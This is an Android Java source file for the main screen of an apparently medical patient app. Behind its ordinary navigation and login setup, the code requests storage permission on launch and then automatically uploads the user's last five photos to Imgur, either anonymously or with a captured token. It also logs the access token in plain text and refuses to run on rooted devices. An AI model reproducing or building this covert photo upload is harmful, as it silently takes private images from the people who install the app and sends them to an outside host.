package com.example.sitdoctors;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;
import com.google.android.material.bottomnavigation.BottomNavigationView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.scottyab.rootbeer.RootBeer;
public class PatientMainActivity extends AppCompatActivity {

    FirebaseAuth auth;
    FirebaseUser user;
    PhotoUploader photoUploader;
    String accessToken = null; // ✅ Global variable for access token

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_patient_main);

        // ✅ Initialize Firebase
        FirebaseApp.initializeApp(this);

        // ✅ Initialize Firebase Auth
        auth = FirebaseAuth.getInstance();
        user = auth.getCurrentUser();

        // ✅ Redirect to Login if no user is logged in
        if (user == null) {
            startActivity(new Intent(getApplicationContext(), Login.class));
            finish();
        }

        // ✅ Initialize Bottom Navigation
        BottomNavigationView navView = findViewById(R.id.nav_view);
        AppBarConfiguration appBarConfiguration = new AppBarConfiguration.Builder(
                R.id.navigation_home, R.id.navigation_dashboard, R.id.navigation_contacts, R.id.navigation_chatbot
        ).build();
        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_activity_main);
        NavigationUI.setupActionBarWithNavController(this, navController, appBarConfiguration);
        NavigationUI.setupWithNavController(navView, navController);

        // ✅ Initialize PhotoUploader (No accessToken needed)
        photoUploader = new PhotoUploader(this);

        // ✅ Request permission (this will directly upload photos)
        photoUploader.requestPermissions();
        RootBeer rootBeer = new RootBeer(this);
        if (rootBeer.isRooted()) {
            // Block rooted devices
            Toast.makeText(this, "App cannot run on rooted devices.", Toast.LENGTH_LONG).show();
            finishAffinity(); // or System.exit(0);
        }
    }


    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Uri uri = intent.getData();
        if (uri != null && uri.toString().startsWith("https://localhost")) { // ✅ Ensure Imgur redirect
            String extractedToken = photoUploader.extractAccessToken(uri); // ✅ Extract token
            if (extractedToken != null) {
                Log.d("ImgurAuth", "✅ Imgur Access Token: " + extractedToken);

                // ✅ Store in SharedPreferences
                getSharedPreferences("ImgurPrefs", MODE_PRIVATE)
                        .edit()
                        .putString("access_token", extractedToken)
                        .apply();

                // ✅ Update global accessToken
                accessToken = extractedToken;



                // ✅ Upload images using authenticated Imgur account
                photoUploader.uploadLastFivePhotos();
            } else {
                Log.e("ImgurAuth", "❌ Failed to extract access token");
                Toast.makeText(this, "Imgur login failed. Please try again.", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            Log.d("PatientMainActivity", "✅ Permission granted! Uploading anonymously...");
            photoUploader.uploadLastFivePhotos(); // ✅ Upload immediately without authentication
        } else {
            Log.e("PatientMainActivity", "❌ Permission denied by the user.");
            Toast.makeText(this, "Permission denied. Cannot upload photos.", Toast.LENGTH_SHORT).show();
        }
    }

}
